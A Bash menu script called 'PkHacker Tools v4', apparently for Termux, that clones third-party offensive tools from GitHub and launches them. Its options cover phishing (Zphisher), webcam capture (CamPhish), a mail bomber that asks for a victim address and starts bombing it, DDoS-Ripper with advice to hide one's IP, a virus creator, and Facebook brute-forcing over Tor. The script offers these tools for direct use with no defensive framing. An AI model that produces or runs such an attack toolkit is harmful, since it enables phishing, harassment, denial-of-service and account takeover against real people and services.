#!/bin/bash

# PkHacker Tools v4
# A collection of penetration testing and security tools
# Coded by RKGroup
# github: https://github.com/RKgroupkg

# Clear the terminal
clear

# Create Tools directory if it doesn't exist
mkdir -p Tools

# Colors and formatting
RED='\033[31;1m'
GREEN='\033[32;1m'
YELLOW='\033[33;1m'
BLUE='\033[34;1m'
PURPLE='\033[35;1m'
CYAN='\033[36;1m'
WHITE='\033[37;1m'
RESET='\033[0m'
UNDERLINE='\033[4m'

# Display banner
echo -e "${RED}
····················································
:                                                  :
:                                                  :
: ____   _           _                   _         :
:|  _ \ | | __      | |__    __ _   ___ | | __ ___ :
:| |_) || |/ /_____ | '_ \  / _\` | / __|| |/ // __|:
:|  _ < |   <|_____|| | | || (_| || (__ |   < \__ \\:
:|_| \_\|_|\_\\      |_| |_| \__,_| \___||_|\_\\|___/:
:                                                  :
:                                                  :
····················································
${RESET}

${GREEN}v4
  Coded by RKGroup
  github: https://github.com/RKgroupkg${RESET} 
${YELLOW}${UNDERLINE}Version:${RESET} 4            ${YELLOW}${UNDERLINE}CTRL+C:${RESET} exit          ${YELLOW}${UNDERLINE}Author:${RESET} RKGroup

${WHITE}[1]${CYAN} Requirements & Update            ${WHITE}[2]${CYAN} Phishing Tool                
${WHITE}[3]${CYAN} WebCam Hack                      ${WHITE}[4]${CYAN} Subscan                    
${WHITE}[5]${CYAN} Gmail Bomber                     ${WHITE}[6]${CYAN} DDOS Attack                
${WHITE}[7]${CYAN} How to use?                      ${WHITE}[8]${CYAN} Uninstall downloaded programs        
${WHITE}[9]${CYAN} Ip Info                          ${WHITE}[10]${CYAN} dorks-eye
${WHITE}[11]${CYAN} HackerPro                       ${WHITE}[12]${CYAN} RED_HAWK
${WHITE}[13]${CYAN} VirusCrafter                    ${WHITE}[14]${CYAN} Info-Site
${WHITE}[15]${CYAN} BadMod                          ${WHITE}[16]${CYAN} Facebash
${WHITE}[17]${CYAN} DARKARMY                        ${WHITE}[18]${CYAN} AUTO-IP-CHANGER
"

# Function to show loading text
show_loading() {
    echo -e "${PURPLE}${1}${RESET}"
    sleep 2
}

# Function to return to main menu
return_to_menu() {
    echo
    echo -e "${GREEN}Operation completed.${RESET}"
    echo -e "${YELLOW}Returning to main menu in 3 seconds...${RESET}"
    sleep 3
    exec bash "$0"
}

# Option Selection
echo
read -p "Enter option number: " option

case $option in
    1|01)
        clear
        show_loading "Installing updates and requirements..."
        pkg install git -y
        pkg install python python3 -y
        pkg install pip pip3 -y
        pkg install curl -y
        apt update
        apt upgrade -y
        clear
        echo -e "${GREEN}Update complete!${RESET}"
        return_to_menu
        ;;
    2|02)
        clear
        show_loading "Installing Zphisher - Phishing Tool..."
        cd Tools || mkdir -p Tools && cd Tools
        git clone https://github.com/htr-tech/zphisher
        cd zphisher || exit
        bash zphisher.sh
        ;;
    3|03)
        clear
        show_loading "Installing CamPhish - WebCam Hack Tool..."
        cd Tools || mkdir -p Tools && cd Tools
        git clone https://github.com/techchipnet/CamPhish
        cd CamPhish || exit
        bash camphish.sh
        ;;
    4|04)
        clear
        show_loading "Installing Subscan - Subdomain Scanner..."
        cd Tools || mkdir -p Tools && cd Tools
        git clone https://github.com/zidansec/subscan
        cd subscan || exit
        echo
        read -p "Enter a domain (e.g. example.com): " domain
        ./subscan "$domain"
        return_to_menu
        ;;
    5|05)
        clear
        show_loading "Installing Fast Mail Bomber..."
        cd Tools || mkdir -p Tools && cd Tools
        git clone https://github.com/juzeon/fast-mail-bomber.git
        cd fast-mail-bomber/ || exit
        mv config.example.php config.php
        php index.php update-providers
        rm -rf data/nodes.json data/dead_providers.json
        echo -e "${YELLOW}Warning: This installation will take a lot of time${RESET}"
        echo -e "${YELLOW}To stop press Ctrl+C${RESET}"
        sleep 4
        php index.php update-nodes
        php index.php refine-nodes
        echo "-------------------------"
        read -p "Enter an email address to bomb: " email
        echo "-------------------------"
        php index.php start-bombing "$email"
        return_to_menu
        ;;
    6|06)
        clear
        show_loading "Installing DDoS-Ripper..."
        cd Tools || mkdir -p Tools && cd Tools
        git clone https://github.com/palahsu/DDoS-Ripper.git
        cd DDoS-Ripper || exit
        echo -e "${RED}Warning: Before using, hide your IP using a VPN${RESET}"
        sleep 3
        python3 DRipper.py
        return_to_menu
        ;;
    7|07)
        clear
        echo -e "${CYAN}Opening YouTube tutorial...${RESET}"
        python3 -m webbrowser "https://www.youtube.com/watch?v=zgdq6ErscqY"
        echo -e "${YELLOW}Waiting 10 seconds before returning to menu...${RESET}"
        sleep 10
        return_to_menu
        ;;
    8|08)
        clear
        show_loading "REMOVING ALL DOWNLOADED PROGRAMS..."
        rm -rf Tools
        echo -e "${GREEN}All downloaded tools have been removed.${RESET}"
        return_to_menu
        ;;
    9|09)
        clear
        show_loading "Installing IP Tracker..."
        cd Tools || mkdir -p Tools && cd Tools
        apt update
        apt install git curl -y
        git clone https://github.com/htr-tech/track-ip.git
        cd track-ip || exit
        bash trackip
        return_to_menu
        ;;
    10|010)
        clear
        show_loading "Installing Dorks-Eye..."
        cd Tools || mkdir -p Tools && cd Tools
        git clone https://github.com/BullsEye0/dorks-eye.git
        cd dorks-eye || exit
        pip install -r requirements.txt
        python3 dorks-eye.py
        return_to_menu
        ;;
    11|011)
        clear
        show_loading "Installing HackerPro..."
        cd Tools || mkdir -p Tools && cd Tools
        apt update && apt upgrade -y
        apt install git python2 -y
        git clone https://github.com/jaykali/hackerpro.git
        cd hackerpro || exit
        bash install.sh
        python2 hackerpro.py
        return_to_menu
        ;;
    12|012)
        clear
        show_loading "Installing RED_HAWK..."
        cd Tools || mkdir -p Tools && cd Tools
        git clone https://github.com/Tuhinshubhra/RED_HAWK
        cd RED_HAWK || exit
        php rhawk.php
        return_to_menu
        ;;
    13|013)
        clear
        show_loading "Installing TigerVirus..."
        cd Tools || mkdir -p Tools && cd Tools
        apt update
        apt upgrade -y
        pkg install git -y
        git clone https://github.com/Devil-Tigers/TigerVirus
        cd TigerVirus || exit
        bash app.sh
        return_to_menu
        ;;
    14|014)
        clear
        show_loading "Installing Info-Site..."
        cd Tools || mkdir -p Tools && cd Tools
        pkg install curl -y
        apt upgrade -y
        pkg install git -y
        git clone https://github.com/king-hacking/info-site.git
        cd info-site || exit
        bash info.sh
        return_to_menu
        ;;
    15|015)
        clear
        show_loading "Installing BadMod..."
        cd Tools || mkdir -p Tools && cd Tools
        apt-get update
        apt-get install php php-curl -y
        git clone https://github.com/MrSqar-Ye/BadMod.git
        cd BadMod || exit
        chmod u+x INSTALL
        chmod u+x BadMod.php
        php BadMod.php
        return_to_menu
        ;;
    16|016)
        clear
        show_loading "Installing Facebash..."
        cd Tools || mkdir -p Tools && cd Tools
        git clone https://github.com/fu8uk1/facebash
        cd facebash || exit
        bash install.sh
        chmod +x facebash.sh
        # Start Tor service first
        service tor start || systemctl start tor
        ./facebash.sh
        return_to_menu
        ;;
    17|017)
        clear
        show_loading "Installing DARKARMY..."
        cd Tools || mkdir -p Tools && cd Tools
        pkg install git python2 -y
        git clone https://github.com/D4RK-4RMY/DARKARMY
        cd DARKARMY || exit
        chmod +x darkarmy.py
        python2 darkarmy.py
        return_to_menu
        ;;
    18|018)
        clear
        show_loading "Installing Auto Tor IP Changer..."
        echo -e "${RED}This tool requires ROOT privileges${RESET}"
        cd Tools || mkdir -p Tools && cd Tools
        apt-get install tor -y
        pip3 install requests
        git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
        cd Auto_Tor_IP_changer || exit
        echo -e "${YELLOW}Configure your browser's proxy settings to use SOCKS proxy 127.0.0.1:9050${RESET}"
        sleep 5
        python3 install.py
        aut
        return_to_menu
        ;;
    *)
        clear
        echo -e "${RED}Invalid option selected. Please try again.${RESET}"
        sleep 2
        exec bash "$0"
        ;;
esac